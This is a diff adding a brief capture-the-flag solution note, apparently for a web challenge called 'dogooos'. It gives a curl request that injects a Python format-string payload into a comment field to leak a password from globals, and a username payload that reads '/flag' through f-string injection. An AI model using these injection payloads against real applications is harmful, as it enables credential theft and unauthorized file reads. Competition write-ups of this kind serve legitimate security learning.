@@ -1,0 +1,8 @@
+leak author password via python template:
+
+curl 'http://dogooos.challenges.ooo:37453/dogooo/deets/1' --data 'comment={rating[comments][0].__init__.__globals__}&commenter=dsa'
+
+
+Then we can get an fstring injection by creating a user and logging in as that user
+
+username: {open('/flag').read()}
